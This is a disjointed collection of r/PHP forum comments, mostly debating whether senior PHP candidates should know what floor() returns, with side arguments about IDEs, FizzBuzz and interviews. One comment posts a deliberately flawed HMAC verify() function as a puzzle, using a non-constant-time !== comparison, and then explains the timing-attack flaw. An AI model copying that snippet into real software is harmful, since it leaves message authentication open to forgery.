I was expecting something tricky, like a question about 5.3 SOAP function calls but floor? It's funny that such a simple question could weed out the inexperienced.
The question would still be wrong because it doesn't ask what the script would output, it asks "what is the result of the `function`". `echo` is not a function, it is a language construct. The only function on his script is `floor`. Either way, the question looks flawed to me.
For the first one, technically no. Just try it and see.
Thats the strangest part of all of this, I can answer most PHP questions from the smaller scale, but I don't have the experience in massive scale or anything, yet. I knew the answer to OP's question and a few other fun ones around here right away. How exactly are you getting your devs? There are tons of developers out there that do beautiful things every day, and have shown me just how far I have to go still to excel at commercial work, which is why I have avoided it. I find it really hard to believe that I'm more capable than a senior dev.
&gt; PHP has many built in functions. just because someone doesn't know what floor() returns doesn't make them a bad PHP developer. Yes, yes it does. No, you don't need to have every PHP function and its argument order memorized, but this is one of the most basic of functions. 
Yep. the type if float of 3.00, but the echo out is only 3.
I'm going to be "that guy" and disagree here. If you don't know what `floor()` does - even in a high-stress situation - that's an automatic out for me (for a senior dev role, especially). It's one thing to not know about `parse_url()`, `extract()`, or maybe even `filter_var()`. But in no reasonable scenario can I ever think of a case where a senior dev would not know what flooring is. I just can't even.
As I said it's more about the conversation than the code. For creating an immutable class to represent an Email could be considered DDD. However if you're not talking to domain experts you're not doing DDD.
Your intention is probably good but the example is terrible. PHP itself has fucked up the string and array functions a lot and it usually doesn't make much logical pattern. I'm talking about it being strlen and having another str_replace function. If someone doesn't know what he is doing when using a foreach loop or passing something by reference or something like that, then there is a problem. One might spend 30 seconds to find something on Google, but not knowing the concept can take much longer to troubleshoot. 
 &lt;br /&gt; &lt;b&gt;Parse error&lt;/b&gt;: syntax error, unexpected '?&amp;gt; ', expecting function (T_FUNCTION) in &lt;b&gt;[...][...]&lt;/b&gt; on line &lt;b&gt;4&lt;/b&gt;&lt;br /&gt; 
If your only knowledge comes from what you're exposed to at work, you're already disqualified as a senior dev in my book. It shows a distinct lack of passion and curiosity, both of which are the hallmarks of a good developer.
I initially read that as "cell()" and thought ... I don't know what that function is. Is it like cons for a lispy type language maybe? Then I realized it was ceil and wiped my brow!
Personally I think this question would really stress me out in an interview situation.. it seems too obvious, as though it's a trick. I mean, why even ask something like this? Do you not want to see some code I wrote? Talk to me about higher-level concepts? If I'm familiar with that kind of stuff, I can always look this stuff up in the docs.. And as you've seen from the other comments in here, that kind of insane trick question isn't uncommon from interviewers..
Some of the others posts here reminded me about a question I had to answer before applying somewhere. I know it's not PHP, but it's the only one I saved. Solve for **unknown** to produce an output of **10**: var x = 6; var y = 4; var a = function(b) { return function(c) { return y + b + c; } }; x = 2; y = 5; var fn = a(x); x = 1; y = 3; var unknown = ?; fn(unknown);
&gt;before the harder questions came,. I'm curious about the harder questions. Can you please share some with us(me)?
Username doesn't check out.
It's literally `floor` though.
No, I am saying we are limited by our experiences. Yes, we sometimes tinker with this or that and build something simply because we can, but despite the fact that I have indeed used both of these functions, it's only been a couple times over the last 10 years. That being said, I am not a PHP dev by day so my exposure is somewhat limited to what I have worked on since I don't get to play with big projects often.
PHP7 has a Null Coalesce Operator for that: https://wiki.php.net/rfc/isset_ternary
Ok, last request. leave out DDD, if you were building similar app, and wanted to easily access database inside route, which method would you apply? I can already do that, like I've shown in my example, but I need something more maintainable and enterprisy-ish 
Um floor means well floor. As in lowest value. its 3. Even ceil would be 3. I am a junior junior junior junior junior and even I know this.
I once tried to do that too (hiring a php programmer). Being a programmer myself I thought of the easiest way to know if someone is familiar with php. Almost no one could tell me the difference between $name = "john"; echo 'hi, $name': and $name = "john"; echo "hi, $name": Well let me tell you I forgot about hiring someone and just kept on by myself
Wouldn't that print warning "Unknown variable $number_of_users" ?
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/webdev] [Magic Box: build Laravel-based REST APIs faster with repositories \[x-post \/r\/php\]](https://np.reddit.com/r/webdev/comments/4k3mvd/magic_box_build_laravelbased_rest_apis_faster/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
The original? [Yes](https://3v4l.org/ujF9h) My answer? [No](https://3v4l.org/jdm3V)
I'm not talking about the behaviour of interviewers. I can as well pick random 5 people from the neighbourhood and ask them the exact same question. If all those people failed to answer such as basic question, then most likely OP (or his HR department) is very weak doing a background check for the candidates. I'm just stating the fact that the question itself is a bit flawed. Yes, it would print 3, but what 3 exactly? String? Integer? Float? If javascript reads that value as-is, what would interpret it as? Integer? String? What is Javascript even? Ecmascript draft 5 interpreted in SpiderMonkey engine? I understand the frustration of OP but I'm just stating the fact that the question seems flawed either way. Asking what the function returns? It is not 3. Asking what the echo outputs? Echo is not a function. I'm pretty skeptic about types and naming things because you must be like this to be a senior programmer. If you rely on strict comparisons (which you should in order to prevent common bugs like strpos('abcde', 'a')) then you should rely on strict types. If you rely on strict types, then you should know about them because INT 2147483647 becomes a FLOAT if you add +1 on 32 bit systems and precision point issues become appearent. You need to know what is a double or what is a precision point if you deal with floats and the list goes on. I'm not telling you to master CS stuff as I'm a self taught PHP developer, but even as a self taught developer, those stuff is what I consider the "basics". Those are the toys you play with every single day for years so learning how they behave on certain scenarios would be great advantage.
`ceil(3.1)` would actually return 4. Edit: What am I being downvoted for here? Providing the correct answer? $ php -a Interactive shell php &gt; echo ceil(3.1); 4
What are the junior positions advertised as on these sites? Is it industry standard to have a training period or is it right into the thick of it? Also, do you guys do relocation/remote work?
Not that I use parenthesis with these, but it's a style choice, not "shoddy code". They work in the same way and are no less readable than without. Don't like them being used that way? Make an RFC...
Today I leaned PDO is even better than I thought.
I was going to say nothing because you didn't close your code ... ?&gt; ;)
Weeks of programming can save you hours of planning. :)
For a unit test, yes. But if you try to unit test your *candidates*, then it is *you* that are flawed. Hiring someone is about a LOT more than whether or not they always verbally give the exact pedant answer even in contexts where the distinction is meaningless information. In fact, for a senior position who will almost surely need to communicate and coordinate with non-devs, I would count the need to ONLY be correct at the expense of being clear or concise against them. They are displaying extreme aptitude as a developer, but an utter lack of the other skills necessary to lead a team. If you gave me that answer in a senior dev interview, it would count against you more than help you. In a mid-level position, it would be a fantastic answer.
Single quotes will echo, "hi, $name" and double quotes will echo, "hi, john".
PHP actually does not care about closing with ?&gt;. In most standards PHP class files shouldn't close the &lt;?php ?&gt; tag
Yes, there will be errors. This is unreadable code for (most) humans, so the next guy (m/f) that has to maintain this code will break this and has to put hours into fixing these uncommented and untested lines of code. If you obfuscate your code for your team, you're a douche and should be let down ASAP.
You're thinking of [rounding](http://php.net/manual/en/function.round.php). * `floor()` rounds down. * `ceil()` rounds up. * `round()` rounds to the nearest whole number (with the default mode).
This approach has its upsides and downsides. It basically eliminates the very best developers from consideration as well as the very worst. The worst either can't or don't want to do this because they are lazy. But the best are not desperate for your position, and very unlikely to commit that much effort to their first interaction with your company when they can simply get another job very easy. This approach is very, very good at one thing: hiring developers who can implement other people's vision and do it without much thought or complaint. Basically, this is the perfect way to interview for "code monkeys", not a great way to interview for a senior position. Especially when a senior position almost always requires non-dev skills as well.
At least you didn't hand out that retarded fizzbuzz problem.
I think what you want is hexangonal archercture. This is where you create interfaces to things outside your domain. So for each repository you would have an interface and in the class implementing that interface you would inject your database connection. Do your queries and then return domain entities etc. This allows you to change the database system with ease.
&gt; We use are an agile company which means we allow our developers to use whatever tools they wish to get the job done. Many don't use IDEs which is fine by me so long as their work is good. That's not what agile means. I ran a team of 12 devs last year, and this was my rule: you can use something besides an IDE if you let me block php.net from your computer. The mistakes that IDEs help prevent are numerous, so the argument is "if you think you're too good for 'training wheels' then prove it".
Oh, I see now. So you managed to send an HTTP request, but not on HTTP side. Thank you for your time, you failed the interview :)
With such a creative imagination surely you should be writing screenplays for the Hollywood.
Besides, 'following a style guide' it's *not* the responsibility of the text editor or the IDE, it's the dev's responsibility to follow those guidelines.
Yeah sure. Capable web-programmers who don't know floor and http.
https://3v4l.org/UB4Xl
It isn't a syntax error it's an omission and it's also knowing if they understood what an anonymous function is. None of the applicants knew what an anonymous functions was or that PHP supported first-class functions. It was a not a good day.
It's been a long day.. I'm so dumb. 
&gt; An IDE made you lazy and dependent. Wrong, an IDE saved you the mental burden of the repetitive aspects of coding so you could focus on the areas that are more intellectually challenging. You know how I can tell when code isn't written with an IDE? It uses "clever" code that saves some keystrokes but is typically architecturally unsound. Classes get shoehorned into uses they aren't designed for. Interfaces are designed broadly generic or ignored entirely to prevent creating yet another file. I see $a and $b and $c and $x and $y and $z over and over. I find copy-pasted bits of slightly-modified code strewn everywhere. When I am constantly switching contexts between writing PHP and SQL and JavaScript and HTML and Perl and Python and Ruby and Java and so on, an IDE becomes a necessity to help me stay within the language context I am currently working in. IDEs aren't panaceas and I won't diss someone for using a plain text editor if they feel so inclined, but I am not going pretend they will somehow be as productive as a good developer with a good IDE. They won't be. I sat a bright guy who swore by text-editor alone down and got him involved in a 1,200 file enterprise application. He immediately started complaining the system was "over-engineered" because he couldn't possibly keep up with the myriad number of files. It wasn't until we got him introduced to a proper IDE that he realized that, yes, we had a shitload of files, but that's what happens when you cleanly organize business rules for 35 different business units in over 100 different markets.
Depends on the encoding. This string might be ISO-8859-1, might be UTF-8. 
No worries!
If you have a middle-school math education you would be able tp deduce what these functions do.
You don't think that policy just came out of a vacuum do you? Non-IDE devs were consistently soaking up more time, more resources, creating more bugs, failing more CI tests, and so on. They kind of had to put up with it, because I was tired of putting up with their preventable mistakes.
Hello, fellow non-rote information seeking interviewer! Agree wholeheartedly, you're interviewing someone for their ability to reason, not regurgitate.
&gt; click to go to class/method, auto adding use statements and php doc blocks? Maybe our workflows differ, but I never needed to do that.
But nobody says this code has been created [for whatever practical purpose]. What made you think so?
Nothing php-specific, no. 
Most people assume that an interview, and therefore the interview questions, at least relate to "whatever practical purpose" that position is for. The code snippet provided does not relate to anything intelligent nor practical. 
If he repents, then a proper beating may suffice as punishment enough. May I suggest 10 lashes? https://www.youtube.com/watch?v=jMsctjoyGzs
I knew that people are direct-minded, but didn't new how much.
Neat I actually didn't clue into this. Guess I didn't get the job!
Actually my first 10 questions are normally geared towards letting them talk about themselves. I don't fail people on not knowing. I fail them on their ability to look at the question, assess it and convey their thoughts about it in an impressive manner. It's a very back-and-forth process. As two people did. It's also not about failure. Sometimes someone can technically fail a question but talk me through their reasoning after being given a clue and impress you. It's about reasoning skills and articulacy more than knowledge. Also It is apparent just from this post that a lot of people don't even understand how anonymous functions actually work in PHP. We have written a PHP 5.5 application that uses Anonymous Functions, Closures, Upload Progress API, Generators, Traits, ArrayIterators, Try/Catch, Custom Exceptionssetc extensively and we need them to be able to replace me fully in two weeks (on medical grounds) so we need to vet pretty hard because I may not be around to answer questions. It is surprising how few people know how to use these things properly.
See, this is a double-edged sword. Some employers don't want people who is scared to death by anything that is beyond their understanding. So it's ok for everyone. Win-win.
This is an offhand guess, but `g` is `null` when `service_main` is called. The initialization order that's assumed by the code is probably changed.
I see what you did there. Nice pivot. 9/10 Will buy again.
Yeah... I'm not even going to touch this.
This is the smallest I can make service_main to reproduce the crash. static void WINAPI service_main(DWORD argc, char **argv) { zend_win32service_globals *g = (zend_win32service_globals*)tmp_service_g; spprintf(&amp;service_key, 0, "%s%s", SERVICES_REG_KEY_ROOT, g-&gt;service_name); } Unless I'm misunderstanding something then ```g``` should never be null. Even in the complete service_main the first line is the same as this shortened one.
It's the only way agencies work, brah.
After 6 months everyone calls himself a senior developer. sick. Besides, what a poor question for an interview! I would not have answered - or answered this: is it a joke? ;-)
That's correlation, not causation... ;)
I don't even know PHP and I got it right.
// is a comment, remember. And look up labels.
So you know, the reason for not closing the PHP tag is so that any white space which may get introduced at the end of the file (i.e. many setups ensure 1 blank line at the end) doesn't get sent to the client just by using include/require and thus cause problems with sending headers
This is not at all true. I graduated high school without ever learning that at all. I also have been programming, self-taught since i was 11 years old and i am now 28. Thats a lot of programming. I work full time and have for the past 9 years as the only web developer for a company, and have never had to use this it all. When i saw this question i had no idea what the answer was. EDIT: changed not 28 to now 28
not buying it, it's one of the first things u know, by reading or by practise.
I've done a bunch of senior developer interviews and a surprising amount of them can't pass FizzBuzz.
$age != 28; $age=11+x; $x = (&gt;8,&lt;17&gt;); I don't know why I felt the need to do that. 
None of your counterarguments can be applied generically. You may have come across some very inept developers who chose to use text editors, but you can't extrapolate those experiences to "anyone who doesn't use an IDE." &gt; I am not going pretend they will somehow be as productive as a good developer with a good IDE. They won't be. As a 17-year vim user, I can assure you that this is a very naive stance to take. Most IDE users don't even know what productivity really is, as their only frames of reference are tools like Notepad++.
Thanks! I barely managed to locate the wiki page for converting/upgrading extensions to php7. Trying to find info on php internals API and not the PHP language API is a royal pita because I'm probably doing it wrong.
TLDR: Fuck your whiteboard sorting algorithm I liked the article, lots of good information, except for the part about whiteboarding sorting algorithms. I am so tired of that being some kind of magic indicator for all programming knowledge. It absolutely IS an implementation detail, and Joel even goes on to talk about the performance of this algorithm you pulled out of your rear. Forcing the developer, hopefully trained against micro-optimizations, to work through a micro-optimization. Let's talk about test driven design. Let's talk about what makes a good API response. Let's talk about what it means to effectively manage and maintain a source repository beyond a week. Let's talk about commitment to continuing education. Let's talk about open source contributions. Let's talk about the ever elusive documentation. Let's talk about the art of software craftsmanship. These things are the things I see WILD, MASSIVE gaps in understanding at nearly every software enterprise. Sorting algorithms, NOT SO MUCH. To rip the "defibrillator / anatomy" analogy to shreds, Why stop at knowing your data structure implementations? Oh you work in PHP but don't know C? You must be a hack. You work in C but have never built a compiler to machine language? Certainly a hack. Never built a processor to execute that machine language? WHY ARE YOU ALIVE?? The point is, we all must admit we can't know everything, and we have to make choices. I don't know how the internals of ElasticSearch work. Someone does, but it isn't me. I know it's really great and get's the job done. I stand on the tireless work of the people who dedicate themselves to greatness in specific areas. We have to say, "below this line, I'm not worrying about it". There are people, very smart people, who really care about sorting algorithm performance, and I will let them be my guide. Additionally, in almost every language, sorting and data structures are a solved problem, and a champion of "Smart+Get things done" would just stand on the shoulders of the smart people who came before them and use what's available until that was no longer "getting things done". I can see a day in the future where SysOPs admins, raised purely in the days of AWS and Infrastructure-as-Code, will be asked to replace a network card on some old dusty server in an interview. "I NEED YOU TO KNOW HOW TO DO THIS" the wizard bearded interviewer will exclaim, "IT'S AN ESSENTIAL FUNDAMENTAL OF YOU KNOWLEDGE!". No one does that anymore, we're a level of abstraction beyond that. Physical servers are an implementation detail. Complex sorting algorithms are no different. Since this is now turning into a rant, I'd also like to toss out with added snark that LinkedLists have huge performance implications, so learning how to reverse them is actually less of a skill than learning how to remove them. /rant from a dude who has whiteboarded some of the worst sorting algorithms you've ever seen in your life
Have you double-checked that `g` isn't null? And that `g-&gt;service_name` is also not null?
I'm just wondering how you have electricity to run a computer to program when gas lamps and a fireplace stove are so much simpler and efficient.
This is why so many places use a basic hackerrank test before even going to the phone interview stage now. Weed out the garbage.
It's a damn Excel function....
I always look at questions like this and think it is a trick. So instead of blurting out the answer I basically walk through my thinking with them so they can at least see I know something. 
Lies! You're an impostor!
Why would the user of the middleware be choosing the implementation since the return type-hint of the middleware is an interface? The user of the middleware doesn't care about the implementation, that's the point of the interface.
You must be quite the giggles to work for.
well I knew what the math and floor functions were in HS, maybe your HS just sucked ass. 
Some of the best developers I know use emacs or vi. There's more out there than jetbrains.
Gotos are a thing to forget for those of us who got started up on Basic.
No fizzbuzz? heh! The question I like is print out the number 1 to 100, but you loop starts with for($i=100......
Then how can they be senior? To go an entire career with out once truncating a float... Do they know what a double is?
People fail it man. All the time. It's scary.
Working by yourself all alone at a company give one an unrealistic perception of their development skills
That's distressing . That sort of implies that they've never seen it in any language. Do these senior developers only know PHP? And only the kind that generates HTML apparently. I'm sitting here trying to come up with promise libraries and these fools are interviewing for senior level developer positions and can't even do basic arithmetic
Seeing as Intellisense literally cannot tell you how and when to implement your API, it really can't cause you to not know the shit you already don't know, so your argument is as retarded as your policy.
I think the great minds know what they're doing. 
I don't know man. People are in positions they shouldn't be all over the world. I know what these are, I've used them, but I'm not a senior dev. I'm not even a dev by day; yet. I guess my point is, people can be great devs and it's possible they just never came across these before. You can't use this one thing as determination as to how well they can actually write code. I know lots of things in practice but I couldn't go all formal and throw the buzz words at you. I've had conversations with people before and they said something I didn't know so I looked it up, only to determine I did know the concept just not what it was called.
VIM is practically an IDE in the right hands. I love it.
Your rightness offends my sensibilities, sir!
I'm saving this post so I can forget about it whenever I come to need it, just like all my other saved Reddit posts. But thanks.
I've only used ceil() / floor() a handful of times. Whether you're familiar with it may just depend on whether or not you've come across a situation where you need it. It might be more important that the dev at least know to look for it if they needed it. So maybe I would go at it the opposite way and ask them what they would do if they had a number like 5.6 or -5.5 and they needed to find the closest whole number less than the value. If they at least say they would look for a built-in function to do that, and maybe use Google to find it, I would accept that as an acceptable answer.
[Don't bother clicking this link. You already know what it is.](https://xkcd.com/292/)
The answer is null. You gotta close your code brackets son!
YES! Thank you ... Now people can stop telling ORM is doing a magic when you ask them "What's 'under the hood' and de-facto a standard in PHP DB operations today". Seriously - I love ORMs and they speed things up a bit (tried to avoid them a couple of times - each time ended up reinventing the wheel...) but they killed basic understanding of database operations for today's beginners ... 
While I agree with most everything you've said in this thread (and it's provided me a lot of amusement), two weeks is an insanely short period to onboard a new *senior* dev, get him up to speed with an existing codebase and productive, good luck :) and I hope you get your medical stuff sorted.
OP was interviewing for a SENIOR dev position and they didn't know what floor was. I can understand less common functions, but anyone with enough experience to be a senior dev would know what that does (or be able to intuit it).
Uhh I beg to differ. Anyone who answers yes would almost certainly be a junior developer. Past that, you should know the basics of HTTP if you're a web dev, so this is actually a great skill testing question.
&gt; Recursion is a good proxy for experience level. Indeed, I'm experienced, I know not to use it^* ^^^*except ^^^when ^^^it ^^^really ^^^makes ^^^sense.
I wouldn't want any developer under my employ to write code like that. To be clear: I mean we emphasize the SOLID principles in our object oriented code. I can't think of a scenario in the OOP world where you'd ever want to do anything remotely like `$var = function()`.
In my opinion a senior dev is more about how they think and their background in tech and not necessarily about the specific technology they're interviewing for. Some of our best hires have been people with no foreknowledge of PHP but had backgrounds in Ruby and .NET. For a senior dev, picking up PHP is no problem.
Agreed. I think these kinds of questions offer limited value and I'm better of focusing the conversation in other areas as I can get a deeper understanding of the candidate elsewhere.
This isn't a trivia question though - it is a fundamental concept of one of the most important factors in development, HTTP requests. It would be equivalent to asking a new mathematician hire if they knew what order of operations are
Yeah it does need a grasp of math to intuit
The dev market is saturated with really bad talent. I work with 4 of them.
You sir are right, I believe if you wanna round up to the next integer, then you have to use ceil
You are right. I only encountered these methods when I answered some codeabbey.com questions.
A lot of developers are going to be turned off by the take-home test approach though. A big factor is who sought out whom - if the developer is applying to a bunch of places it may work, but if you're trying to poach them, expect an eye roll in return. Still, having a useful things to look for as well as a task that allows you to hit many of them at once is a very good approach in general.
&gt; "At the other extreme youve got your brilliant superstars who write lisp compilers for fun, in a weekend, in Assembler for the Nintendo DS. And in the middle, you have a large number of maybes who seem like they might just be able to contribute something. The trick is telling the difference between the superstars and the maybes, because the secret is that you dont want to hire any of the maybes. Ever." I'd rather have a "maybe" with a good attitude and potential than a "superstar" with a bad attitude.
The answer is 369 replies and counting.
Yeah fair enough!
Next time, ask them what this returns: floor(8.2 - 0.2);  Edit: Doh!
 for($i=100; $i&lt;200; $i++) { echo $i - 99; } --- for ($i=100; $i&gt;0; $i--) { echo 101 - $i; } --- for($i=100; $i&lt;200; $i++) { echo ($i+2) % 101; } --- or my personal favourite: for($i=100/100; $i&lt;=100; $i++) { echo $i; } :P
That's a special level of tactless.
To be fair, your question is nonsensical. That's not a function. But I have no trouble believing your candidates were rough. :)
To be fair, if they came through recruiters, recruiters ALWAYS end up overselling their candidates. So you were dealing with senior-in-recruiter-speak-only seniors, not salty fucks who have actually seen shit.
It's a red flag to me. Of course, I don't go into interviews thinking of them as "adversarial" or "hazing rituals". Any interviewer or interviewee with that mentality is bound to have a lot more problems than forgetting basic functions. 
Not all interviews, just the typical trivia and whiteboard exercise types of programming interviews. Here's an example of what I mean: What's the bug in this code? function verify(string $string) { $string = base64_decode($string); $hmac = substr($string, 0, 32); $message = substr($string, 32); $calc = hash_hmac('sha256', $message, SECRET_KEY, true); if ($hmac !== $calc) { return false; } return $message; } Go on, guess. I'll tell you the answer afterwards.
This would be a terrible interview question; OP's example was a one-liner that basically asks 'have you actually used the language before'. The error I see is that base64_decode requires you to pass in $string. I'm guessing that's just a typo though. 
That one was a typo. There's a more pertinent one.
&gt;I guess my point is, people can be great devs and it's possible they just never came across these before. I'm going to argue strongly against this. This is so inherently 101 that it actually boggles the mind that people considering themselves "senior" yet do not know this. It's actually nothing short of embarrassing IMHO. &gt;You can't use this one thing as determination as to how well they can actually write code. If you can't truncate a float, I'm going to assume you also don't understand the basics of something imperative like array manipulation, or string interpolation, both of which I easily consider just as 101 and vital for even a novice dev to understand fully, let alone a senior. &gt;I know lots of things in practice but I couldn't go all formal and throw the buzz words at you. Which is why I'll assume you said this earlier: &gt;&gt;but I'm not a senior dev. Someone who calls themselves a senior dev most certainly should understand these things, as anyone actually coding in a regular capacity, regardless of language, is almost certainly using a float type function at the very least often enough that they know what the hell it is. These aren't buzzwords, they're the essentials. Doctors don't often come across adults with the measles, but they can spot it from a mile away cause it's part of basic medical knowledge despite it not being something they encounter often. This is no different (well, minus the being sick and dying part that is...)
An error. The php is not closed.
The bug is in `!==`, which shouldn't be used for MAC validation because of [timing attacks](http://blog.ircmaxell.com/2014/11/its-all-about-time.html). I'm glad we agree that it's a terrible question, but if I was hiring security engineers the *traditional programming interview* way, I'd probably be asking people to spot cryptographic side-channels in code just like that. (Also, it's not checking that `base64_decode()` didn't return false, nor is it verifying that the decoded message is at least 32 bytes long.)
Sure, but this is basically the definition of a strawman argument. Your interview question is terrible, but that doesn't make OP's question terrible. 
It's a strawman for the purpose of illustrating a point. If your search parameters are "will jump through the same programming-interview hoops I did, has a passable resume, can hide nervousness well and whiteboard under pressure", then you'll get exactly that. But these types of interviews are very bad for finding the talent that the rest of the industry misses. Companies employing traditional means will continue to fight each over over a small portion of recognized talent, which is their prerogative.
I don't think I've ever needed to do this in PHP. For financial stuff, I've always stuck with ints, and anything else, I've not wanted to throw away data, and just displayed stuff to relevant decimal places.
I've only studied a little PHP, and I knew that. 
My favourite question is "what do you dislike about &lt;insert relevant language&gt;?". Nothing shows experience in a language like insights into how that language has screwed you over. Senior developers have battle scars.
Good....zjob?
Programmers solve programming problems. Software developers solve business problems through programming. 
Thanks man
Here is what an HTTP request looks like: GET /resource HTTP 1.0 or POST /resource HTTP 1.0 any combination will make an error. All the speculations on whatever post-processing or data interpretation are off the track.
Not at this very moment, but we should be very soon.
A programming forum? Never! :)
This is kinda like recruiting an author and asking them the definition of one word. You're testing one specific piece of knowledge/trivia rather than the general experience/ability of a programmer. There could be many experienced programmers that never needed to use floor() before. And that function specifically has a very analogy-based name kinda of like explode() does - compared to something obvious like mysql_escape_string(), even if you never used it before (and never should). If the goal is just to weed out the people that can't program at all, I think something more logic based makes sense, like some for(), switch() and if()s nested into each other than doesn't require knowledge of a specific function. 
this is the greatest fucking comment
Well, this is the benefit of formal education. It doesn't necessarily come up every year but I've certainly used floor, ceiling and modulus divide many times over my career.
You didn't even do 3.6? Geesh..
I know the answer man, but it does feel a bit shitty to preclude them based on it. I know what floor means based on math much more so than PHP...ive used it less than 5 times ever in real world situations. IMO being a good dev is more about the ability to attain knowledge to build a solution than knowing the implementation details precisely. 
Ignorant of PHP, I'd immediately think "that's a scoping gotcha" and wonder how PHP handles global variables. I wouldn't know the answer but I might have the right questions. A senior dev who's been around a few languages should be able to see the question is about global scope.
It could be your resume filtering is broken. I almost never get interviews, even for jobs where I score 100% on their buzzword bingo. It could be your process is rejecting potentially good candidates out the gate and letting through a ton of false positives.
Unless its in phpstorm, where it does it for you.
Yeh. It's me in guilty for all the people who didn't knew floor() in the OP.
gzip
I am a bit surprised the author choose to put the type in front of the identifier rather than behind, e.g. "public $count: int" 
&gt; I can't think of a scenario in the OOP world Smalltalk, which is *the* definition of object oriented, has always supported lambda functions. Objective-C, C++, and Java all used to not have them, all commonly referred to "object oriented" and have all added them once compiler-technology has improved to make them cheap and fast enough. Lambda functions are therefore *part* of object oriented programming. And yet you've already closed your mind to them because *you* can't "think of any scenario". When I find someone can do something I cannot do, I do not say to myself, "oh I can't think of that, so it must not be good". Quite the opposite! I try to learn it myself, because even it's *social* value will be useful -- I will be able to talk to more programmers about more things! However in this case, lambda (or inline) functions are more than just socially good, they are faster than alternatives, and they improve readability, so by learning how to use them your code will be shorter and faster and more correct! An inline function assists readability because it puts implementation as near as possible to where it is used. I do not think you should not create new names for things that are only used once because you'll end up with too many names for the programmer to remember, and you'll be forcing the reader to bounce all around your program to read and re-read parts to understand what you meant! An inline function is also a great way to inject a transformer into some operation because it's much smaller than a single-use class with a single method (and PHP doesn't support anonymous inner classes like Java, so older PHP frameworks really suffered from this!). An entire category of \*Adapters and \*Filters and so on simply do not need to be written! That means much *much* less code that you need to keep around! 
I never do unless I have to. It's almost a best practice these days. The idea is you can never accidentally put a space after the closing tag this way.
And what is the result of this function? &lt;?php echo floor(-3.14);
I don't have any other experiences with goto's either except for during one of my educations which covered 20h of assembly programming which has goto's if I dont remember wrong (this was 10 years ago). That is probably the only time that I know of goto's being used.
I assume this was based on pretty much vanilla PHP.
I think I like the `public $item: array;` syntax, that would be my vote given the method construct.
It's not retarded if it works. Sadly, it does.
Are you aware there is an Asgard CMS based on Laravel? http://www.asgardcms.com/ This may cause confusion and damage both projects.
Derp? :P
Are you hiring? Can I apply :) /u/rbnc
I completely agree, but floor(3.1) is not really an edge case where the interpreter will do something unexpected, nor is it a little known function that you're expected to google every time you need it. Of course this particular question is not a good way to evaluate a developer, and I wouldn't blame someone for not knowing the answer (there are probably other similarly simple functions I've forgotten or never used myself), but it *is* surprising that 4 out of 5 senior PHP developers don't know the answer.
I'm aware. My framework existed long before them and I told them when they made a post on reddit: https://www.reddit.com/r/PHP/comments/37lglm/asgard_cms/crnxyre
Not closing the php tag has been best practice for a decade or more...
The point being, though, that the value is still `float` despite being displayed as an Integer.
They should at least be able to say that this is a function that takes a float, transforms it in some way, then the echo statement pushes it to the output stream. Saying "not a clue" does not show much "dev" in their skillset. 
It's a frickin' function. Give it a parameter. This is a debugging exercise, so "what does this do" is a bit of a trick question. The answer is "not what was intended".
I'm surprised it's throwing a TypeError instead of a a new NullPointerException.
Thank you. I assume you can tell how much time it takes to run all the tests, to dig into bugs and stuff to write a relatively small article. There is an [old whine of mine](http://meta.stackexchange.com/questions/171172/stack-overflow-technology-makes-me-write-bad-answers), that quite explains why I quit writing extended answers on SO and decided to run a site of my own. Just because the outcome is incomparable to the effort. By the way, there is still a bug that I was unable to resolve. It seems to me that PDO::FETCH_SERIALIZE seems to be broken. Or at least I was unable to make it work.
I was talking more in general, not strictly to floor. &amp;nbsp;&amp;nbsp; I agree with you that floor(3.1) is not an edge case, but what I wanted to say is that because PHP is an interpreted language and wishes to be friendly with the newcomers, there are many small things where the interpreter could act in a unexpected way, because sometimes it assumes that the developer is wrong and tries to fix the issue how it can, instead of spiting an error or at least a warning where it makes sense. +/u/CompileBot php &lt;?php echo 4 + '2.52 small bears went to disco.'.PHP_EOL; echo pi() + 'abracadabra' + -1.11 + 1.11.PHP_EOL; var_dump(true != 0); var_dump(null &lt; -1); There are many things like this where you can be taken by surprise. You analyze the problem, you understand why your code doesn't work as expected, but if you don't find yourself in a similar situation for some time, you will forget about it and most likely you will do the same mistake second time.
Whenever a company has a data leak of users' addresses/personal info etc (not credit cards), there's always cries of "it should have been encrypted". But for your typical website where users can login and **view/edit** their address record, i.e. the form shows the existing address they entered previously... how could this be encrypted on the web server itself? And even if you are encrypting the data before sending it to SQL, this would make it basically impossible to really do any kind of aggregating/searching or anything useful in SQL itself. Of course when you're dealing with multiple servers or just transmitting the data elsewhere, then doing some encryption there is easy. It's also easy to use an encrypted filesystem etc, but that only really stops someone who physically steals the server. Any online attacker is likely going to be in at the level of your app (PHP) code. I'm really just talking about the situation of a single web server that needs to be able to **read** the data, not just store it.
Why don't we just make hack syntax a php 8.0? ;)
I will take that as a compliment and wanted to thank you. &amp;nbsp; &amp;nbsp; I know that the "hired" part was a joke, but wanted to throw my philosophy regarding the subject. I never accepted a senior dev job and I don't plan to do so in the next coming years, because from my perspective a senior position implies that I will be the person with most experience and that will force me to stop learning. &amp;nbsp; &amp;nbsp; In a senior position you are the big fish from the pound and that will keep you in your comfort zone all the time. It will be nice and comfy but the side effect will be that you will stop evolving as a developer. Expand this to a few years and you will find yourself in a position where most of your experience is obsolete and you "force" your juniors to use/learn those obsolete things. &amp;nbsp; I prefer to be a small fish inside a big pound, because that means that there will be more experienced/smarter developers in the team, from which I can learn new things every day.
In your readme you mention fuzz/api-server but I can't seem to find anything about this?
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
This is not spam, just some honest rick rolling on a lazy friday =)
At least for Node, PS works equally well. I've a couple of Node-only projects in PS, everything I need is there: ES6, eslint, etc.
+1
You remind me that I should probably mention that the Search Engine only makes sense when used directly from the controller. I wouldn't inject it in other services (for those I'd rather use your approach).
this kind of question is for the interviewer to show to the guy how skilled he is, maybe? Maybe not. Code golf++
You can try with grep grep "yourText" dir/fileprefix_*
TIL. Thanks.
Maybe now is not the best time to brag about repository stats...
Does anyone know zimt's arguments against this? I would have thought it would be 100% in favour.
Its a very good feature, and I like the chosen syntax too. Some people want to use a different syntax, but Id say stick with the C/C++/JAVA/C# syntax is the better choice. Also it is consistent with how this feature works in Hack. 
well the ide can now auto generate the phpdoc for you.
